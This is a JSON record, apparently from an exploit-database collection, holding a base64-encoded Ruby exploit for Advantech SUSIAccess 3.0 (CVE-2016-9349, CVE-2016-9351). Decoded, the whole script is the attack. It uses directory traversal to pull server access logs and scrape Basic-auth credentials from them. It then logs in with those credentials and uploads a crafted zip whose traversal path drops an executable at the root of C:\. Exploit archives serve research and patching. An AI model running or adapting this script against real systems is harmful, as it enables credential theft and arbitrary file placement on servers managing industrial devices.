{
    "source": "exploit-database", 
    "exploit": "IyEgL3Vzci9iaW4vZW52IHJ1YnkNCg0KPWJlZ2luDQpFeHBsb2l0IFRpdGxlOiBBZHZhbnRlY2ggU1VTSUFjY2VzcyBSZWNvdmVyeU1nbXQgRmlsZSBVcGxvYWQNCkRhdGU6IDA3LzMxLzE3DQpFeHBsb2l0IEF1dGhvcjogamFtZXMgZml0dHMgDQpWZW5kb3IgSG9tZXBhZ2U6IGh0dHA6Ly93d3cuYWR2YW50ZWNoLmNvbS8NClZlcnNpb246IEFkdmFudGVjaCBTVVNJQWNjZXNzIDw9IDMuMA0KVGVzdGVkIG9uOiBXaW5kb3dzIDcgU1AxDQpSZWxhdmFudCBBZHZpc29yaWVzOg0KCVpESS0xNi02MzANCglaREktMTYtNjI4DQoJQ1ZFLTIwMTYtOTM0OQ0KCUNWRS0yMDE2LTkzNTENCglCSUQtOTQ2MjkNCglJQ1NBLTE2LTMzNi0wNA0KDQpOb3RlczoNCglUaGlzIFBvQyB3aWxsIHVwbG9hZCBBY3JvbmlzSW5zdGFsbGVyLmV4ZSB0byB0aGUgcm9vdCBvZiBDOlwNCglZb3UgY2FuIG1vZGlmeSB0aGlzIHRvIGRyb3AgZmlsZXMgd2hlcmUgZXZlciB5b3Ugd2FudCBvbiB0aGUNCglmaWxlc3lzdGVtLg0KDQoJQnkgZGVmYXVsdCB0aGUgc2NyaXB0IHdpbGwgdXNlIHRoZSBkaXJlY3RvcnkgdHJhdmVyc2FsIHZ1bG4NCgl0byBwdWxsIGRvd24gdGhlIGxvZyBmaWxlcyBhbmQgcGFyc2UgZm9yIHRoZSBiYXNlNjQgZW5jb2RlZA0KCWNyZWRlbnRpYWxzLiBPbmNlIGl0IGhhcyB0aGF0LCBpdCB3aWxsIHVzZSB0aGVtIHRvIGxvZyBpbnRvDQoJdGhlIGFwcGxpY2F0aW9uIGFuZCB1cGxvYWQgdGhlIG1hbGljaW91cyB6aXAgZmlsZS4NCj1lbmQNCg0KcmVxdWlyZSAnbWltZS90eXBlcycNCnJlcXVpcmUgJ2ZpbGV1dGlscycNCnJlcXVpcmUgJ25ldC9odHRwJw0KcmVxdWlyZSAnbm9rb2dpcmknDQpyZXF1aXJlICdiYXNlNjQnDQpyZXF1aXJlICdkaWdlc3QnDQpyZXF1aXJlICdkYXRlJw0KcmVxdWlyZSAndXJpJw0KcmVxdWlyZSAnemlwJw0KDQpkZWYgdXBsb2FkWmlwKHRhcmdldCwgY3JlZHMsIGNvb2tpZXMpDQoJdXJpID0gVVJJKCJodHRwOi8vI3t0YXJnZXR9OjgwODAvd2VicmVzb3VyY2VzL1JlY292ZXJ5TWdtdC91cGxvYWQiKQ0KCWJvdW5kID0gIkFhQmJDY0RkRWUiDQoNCglwYXRoID0gRGlyLnB3ZA0KCXppcGZpbGUgPSAiI3twYXRofS91cGRhdGUuemlwIg0KDQoJcG9zdF9kYXRhID0gW10NCglwb3N0X2RhdGEgPDwgIi0tI3tib3VuZH1cclxuIg0KCXBvc3RfZGF0YSA8PCAiQ29udGVudC1EaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPVwiZnJtVXBkYXRlU2V0dGluZ19BY3JvbmlzX0xhc3RVcGRhdGVOYW1lXCIiDQoJcG9zdF9kYXRhIDw8ICJcclxuXHJcblxyXG4iDQoJcG9zdF9kYXRhIDw8ICItLSN7Ym91bmR9XHJcbiINCglwb3N0X2RhdGEgPDwgIkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT1cImZybVVwZGF0ZVNldHRpbmdfQWNyb25pc19VcGxvYWRGaWxlRnVsbE5hbWVcIiINCglwb3N0X2RhdGEgPDwgIlxyXG5cclxudXBkYXRlLnppcFxyXG4iDQoJcG9zdF9kYXRhIDw8ICItLSN7Ym91bmR9XHJcbiINCglwb3N0X2RhdGEgPDwgIkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT1cImZybVVwZGF0ZVNldHRpbmdfQWNyb25pc19Db250ZW50XCIiDQoJcG9zdF9kYXRhIDw8ICJcclxuXHJcbiINCglwb3N0X2RhdGEgPDwgIjxyZXF1ZXN0IEF1dGhvcml6YXRpb249XCIje2NyZWRzWzBdLnRvX3N9XCIvPlxyXG4iDQoJcG9zdF9kYXRhIDw8ICItLSN7Ym91bmR9XHJcbiINCglwb3N0X2RhdGEgPDwgIkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT1cImZybVVwZGF0ZVNldHRpbmdfQWNyb25pc19GaWxlSW5wdXRcIjsgZmlsZW5hbWU9XCJ1cGRhdGUuemlwXCIiDQoJcG9zdF9kYXRhIDw8ICJcclxuQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi96aXAiDQoJcG9zdF9kYXRhIDw8ICJcclxuXHJcbiINCglwb3N0X2RhdGEgPDwgRmlsZS5yZWFkKHppcGZpbGUpDQoJcG9zdF9kYXRhIDw8ICJcclxuXHJcbi0tI3tib3VuZH0tLVxyXG4iDQoNCglyZXEgPSBOZXQ6OkhUVFA6OlBvc3QubmV3KHVyaSwgaW5pdGhlYWRlciA9IHsNCgkJCSdDb29raWUnCQkJCQkJPT4JY29va2llcywNCgkJCSdBdXRob3JpemF0aW9uJwkJCT0+CSJCYXNpYyAje2NyZWRzWzBdLnRvX3N9IiwNCgkJCSdYLVJlcXVlc3RlZC1XaXRoJwk9PgkiWE1MSHR0cFJlcXVlc3QiLA0KCQkJJ0NvbnRlbnQtVHlwZScJCQk9PgkibXVsdGlwYXJ0L2Zvcm0tZGF0YTsgYm91bmRhcnk9I3tib3VuZH0iLA0KCQkJJ1VzZXItQWdlbnQnCQkJCT0+CSJNb3ppbGxhLzUuMCAoWDExOyBMaW51eCB4ODZfNjQ7IHJ2OjUyLjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvNTIuMCIsDQoJCQknQWNjZXB0LUxhbmd1YWdlJwkJPT4JImVuLVVTLGVuO3E9MC41IiwNCgkJCSdBY2NlcHQnCQkJCQkJPT4JInRleHQvcGxhaW4sICovKjsgcT0wLjAxIiwNCgkJCSdDb25uZWN0aW9uJwkJCQk9PgkiY2xvc2UiDQoJfSkNCg0KCXJlcS5ib2R5ID0gcG9zdF9kYXRhLmpvaW4NCg0KCWh0dHAgPSBOZXQ6OkhUVFAubmV3KCIje3RhcmdldH0iLCA4MDgwKQ0KCXJlcyA9IGh0dHAuc3RhcnQge3xodHRwfCBodHRwLnJlcXVlc3QocmVxKX0NCg0KCWlmIHJlcy5jb2RlID1+IC8yMDAvDQoJCXB1dHMgIlsrXSBVcGxvYWQgc3VjY2Vzc2Z1bCEiDQoJZW5kDQplbmQNCg0KZGVmIGNyYWZ0WmlwKHRhcmdldCwgcGF5bG9hZCkNCglwYXRoID0gIi4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uL1Byb2dyYW0lMjBGaWxlc1xcQWR2YW50ZWNoXFxTVVNJQWNjZXNzJTIwMy4wJTIwU2VydmVyXFxTZXR0aW5nLnhtbCINCg0KCXVyaSA9IFVSSSgiaHR0cDovLyN7dGFyZ2V0fTo4MDgwL2Rvd25sb2FkQ1NWLmpzcD9maWxlPSN7cGF0aH0iKQ0KCXJlcyA9IE5ldDo6SFRUUC5nZXRfcmVzcG9uc2UodXJpKQ0KCXhtbCA9IE5va29naXJpOjpYTUwocmVzLmJvZHkpDQoJdmVyID0geG1sLnhwYXRoKCcvL3NldHRpbmcvQ29uZmlndXJhdGlvbi9UaHJpZFBhcnR5L0Fjcm9uaXMvdmVyc2lvbicpLnRvX3Muc3BsaXQoIj0iKVsxXS5zcGxpdCgiXCIiKVsxXQ0KCWtlcm5fdmVyID0geG1sLnhwYXRoKCcvL3NldHRpbmcvQ29uZmlndXJhdGlvbi9UaHJpZFBhcnR5L0Fjcm9uaXMva2VybmFsX3ZlcnNpb24nKS50b19zLnNwbGl0KCI9IilbMV0uc3BsaXQoIlwiIilbMV0NCg0KCSMgdmVyc2lvbiBpbmZvcm1hdGlvbiBkb2Vzbid0IG1hdHRlcg0KCSMgdGhlIGFwcGxpY2F0aW9uIHdpbGwgc3RpbGwgZXh0cmFjdCB0aGUgemlwDQoJIyBmaWxlIHJlZ2FyZGxlc3Mgb2Ygd2hldGhlciBvciBub3QgaXRzDQoJIyBhIGdyZWF0ZXIgdmVyc2lvbiBvciBsZXNzZXINCglmID0gRmlsZS5vcGVuKCJMYXRlc3RWZXJzaW9uLnR4dCIsICd3JykNCglmLnB1dHMoIkluc3RhbGxlciBWZXJzaW9uOiAje3Zlcn1cclxuQXBwbGljYXRpb24gVmVyc2lvbjogI3trZXJuX3Zlcn0iKQ0KCWYuY2xvc2UNCg0KCWYgPSBGaWxlLm9wZW4oIm1kNS50eHQiLCAndycpDQoJbWQ1ID0gRGlnZXN0OjpNRDUuaGV4ZGlnZXN0KEZpbGUucmVhZCgiQWNyb25pc0luc3RhbGxlci5leGUiKSkNCglmLnB1dHMgbWQ1DQoJZi5jbG9zZQ0KDQoJcGF0aCA9IERpci5wd2QNCgl6aXBmaWxlID0gIiN7cGF0aH0vdXBkYXRlLnppcCINCg0KCWlmIEZpbGUuZXhpc3Q/KHppcGZpbGUpDQoJCUZpbGVVdGlscy5ybSh6aXBmaWxlKQ0KCWVuZA0KDQoJZmlsZXMgPSBbIkFjcm9uaXNJbnN0YWxsZXIuZXhlIiwgIkxhdGVzdFZlcnNpb24udHh0IiwgIm1kNS50eHQiXQ0KDQoJbGV2ZWxzID0gIi4uLyIgKiAxMA0KCVppcDo6RmlsZS5vcGVuKHppcGZpbGUsIFppcDo6RmlsZTo6Q1JFQVRFKSBkbyB8emlwfA0KCQlmaWxlcy5lYWNoIGRvIHxmbmFtZXwNCgkJCWlmIGZuYW1lID09ICJBY3JvbmlzSW5zdGFsbGVyLmV4ZSINCgkJCQl6aXAuYWRkKCIje2xldmVsc30je2ZuYW1lfSIsIGZuYW1lKQ0KCQkJZW5kDQoJCQl6aXAuYWRkKGZuYW1lLCBmbmFtZSkNCgkJZW5kDQoJZW5kDQoNCglpZiBGaWxlLmV4aXN0Pyh6aXBmaWxlKQ0KCQlwdXRzICJbIV0gTWFsaWNpb3VzIHppcCBjcmVhdGVkIHN1Y2Nlc3NmdWxseSINCgllbmQNCmVuZA0KDQpkZWYgZG9Mb2dpbih0YXJnZXQsIGNyZWRzKQ0KCWZvcm1hdHRlZERhdGUgPSBEYXRlVGltZS5ub3cuc3RyZnRpbWUoIiVhICViICVkICVZICVIOiVNOiVTIEdNVC0wNDAwIChFRFQpIikNCglmb3JtYXR0ZWREYXRlID0gVVJJOjplbmNvZGUoZm9ybWF0dGVkRGF0ZSkNCg0KCXVyaSA9IFVSSSgiaHR0cDovLyN7dGFyZ2V0fTo4MDgwL2ZybVNlcnZlci5qc3A/ZD0je2Zvcm1hdHRlZERhdGV9IikNCg0KCXJlcyA9IE5ldDo6SFRUUC5nZXRfcmVzcG9uc2UodXJpKQ0KCWpzZXNzaWQgPSByZXMuaGVhZGVyWydTZXQtQ29va2llJ10uc3BsaXQoJzsnKVswXQ0KCWNvb2tpZXMgPSAiZGV2aWNlVHlwZT1wYzsgbG9nNGpxPU9GRjsgc2VsZWN0ZWRMYW5nPWVuX1VTOyAje2pzZXNzaWR9Ig0KDQoJdW5hbWUgPSBCYXNlNjQuZGVjb2RlNjQoY3JlZHNbMF0udG9fcykuc3BsaXQoIjoiKVswXQ0KCXBhc3MgPSBCYXNlNjQuZGVjb2RlNjQoY3JlZHNbMF0udG9fcykuc3BsaXQoIjoiKVsxXQ0KDQoJZGF0YSA9ICI8cmVxdWVzdCBBdXRob3JpemF0aW9uPVwiI3tjcmVkc1swXS50b19zfVwiPiINCglkYXRhIDw8ICI8aXRlbSBuYW1lPVwidXNlcm5hbWVcIiB2YWx1ZT1cIiN7dW5hbWV9XCIvPiINCglkYXRhIDw8ICI8aXRlbSBuYW1lPVwicGFzc3dvcmRcIiB2YWx1ZT1cIiN7cGFzc31cIi8+Ig0KCWRhdGEgPDwgIjwvcmVxdWVzdD4iDQoNCglwdXRzICJbK10gQXR0ZW1wdGluZyBsb2dpbiB3aXRoIHBpbGZlcmVkIGNyZWRlbnRpYWxzIG5vdyINCgl1cmkgPSBVUkkoImh0dHA6Ly8je3RhcmdldH06ODA4MC93ZWJyZXNvdXJjZXMvQWNjb3VudE1nbXQvTG9naW4iKQ0KDQoJcmVxID0gTmV0OjpIVFRQOjpQb3N0Lm5ldyh1cmksIGluaXRoZWFkZXIgPSB7DQoJCSdDb250ZW50LVR5cGUnICAgICAgPT4gICJhcHBsaWNhdGlvbi94bWwiLA0KCQknQ29va2llcycgICAgICAgICAgID0+ICBjb29raWVzLA0KCQknQXV0aG9yaXphdGlvbicgICAgID0+ICAiQmFzaWMgI3tjcmVkc1swXS50b19zfSIsDQoJCSdYLVJlcXVlc3RlZC1XaXRoJyAgPT4gICdYTUxIdHRwUmVxdWVzdCcNCgl9KQ0KDQoJcmVxLmJvZHkgPSBkYXRhDQoNCglodHRwID0gTmV0OjpIVFRQLm5ldygiI3t0YXJnZXR9IiwgODA4MCkNCglyZXMgPSBodHRwLnN0YXJ0IHt8aHR0cHwgaHR0cC5yZXF1ZXN0KHJlcSl9DQoNCglpZiByZXMuYm9keSA9fiAvPHJlc3VsdD48cm9sZSBuYW1lLw0KCQlwdXRzICJbK10gTG9naW4gc3VjY2Vzc2Z1bCEiDQoJCXJldHVybiBjb29raWVzDQoJZWxzZQ0KCQlwdXRzICJbLV0gU29tZXRoaW5nIHdlbnQgd3JvbmcuLi4iDQoJZW5kDQoJDQplbmQNCg0KZGVmIGdldENyZWRzKHRhcmdldCkNCgljbnQgPSAxDQoJZCA9IERhdGUudG9kYXkNCglkLnN0cmZ0aW1lKCIleS0lbS0lZCIpDQoJY3JlZHMgPSBbXQ0KDQoJd2hpbGUgY250IDwgMzENCgkJZmRhdGUgPSBkIC0gY250DQoJCWNudCArPSAxDQoNCgkJcGF0aCA9ICIuLi8uLi8uLi8uLi8uLi8uLi8uLi8uLi8uLi8uLi9Qcm9ncmFtIEZpbGVzXFxBcGFjaGUgU29mdHdhcmUgRm91bmRhdGlvblxcbG9nc1xcIg0KCQlmaWxlID0gImxvY2FsaG9zdF9hY2Nlc3NfbG9nLiN7ZmRhdGV9LnR4dCINCgkJZnVsbF9wYXRoID0gcGF0aCArIGZpbGUNCg0KCQl1cmkgPSBVUkkoImh0dHA6Ly8je3RhcmdldH06ODA4MC9kb3dubG9hZENTVi5qc3A/ZmlsZT0je2Z1bGxfcGF0aH0iKQ0KDQoJCXJlcyA9IE5ldDo6SFRUUC5nZXRfcmVzcG9uc2UodXJpKQ0KDQoJCWlmIHJlcy5jb2RlID1+IC8yMDAvDQoJCQljcmVkcyA8PCByZXMuYm9keS5zY2FuKC8oPzw9QXV0aG9yaXphdGlvbj0lMjIpW0EtWmEtejAtOT1dKy8pDQoJCWVuZA0KCWVuZA0KCXJldHVybiBjcmVkcy5mbGF0dGVuLnVuaXENCmVuZA0KDQojIw0KIyBNYWluDQojIw0KaWYgQVJHVi5sZW5ndGggIT0gMQ0KCXB1dHMgIlVzYWdlOlxyXG5cdHJ1YnkgI3skMH0gW1RBUkdFVCBJUF0iDQplbHNlDQoJdGFyZ2V0ID0gQVJHVlswXQ0KCXBheWxvYWQgPSAiQWNyb25pc0luc3RhbGxlci5leGUiDQoJDQoJcHV0cyAiWytdIEV4dHJhY3RpbmcgY3JlZGVudGlhbHMgbm93Li4uIg0KCWNyZWRlbnRpYWxzID0gZ2V0Q3JlZHModGFyZ2V0KQ0KCWlmIGNyZWRlbnRpYWxzLmxlbmd0aCA+IDANCgkJcHV0cyAiWyFdIENyZWRlbnRpYWxzIGZvdW5kISINCgkJY29va2llcyA9IGRvTG9naW4odGFyZ2V0LCBjcmVkZW50aWFscykNCgkJcHV0cyAiWytdIENyYWZ0aW5nIG1hbGljaW91cyB6aXAgbm93Li4uIg0KCQljcmFmdFppcCh0YXJnZXQsIHBheWxvYWQpDQoJCXVwbG9hZFppcCh0YXJnZXQsIGNyZWRlbnRpYWxzLCBjb29raWVzKQ0KCWVsc2UNCgkJcHV0cyAiWy1dIENyZWRlbnRpYWxzIG5vdCBmb3VuZC4uIFRyeSBzZWFyY2hpbmcgZm9yIG1vcmUgbG9nIGZpbGVzLi4iDQoJCWV4aXQNCgllbmQNCmVuZA==", 
    "filename": "platforms/jsp/webapps/42402.rb", 
    "id": "42402", 
    "cves": [
        "CVE-2016-9351", 
        "CVE-2016-9349"
    ]
}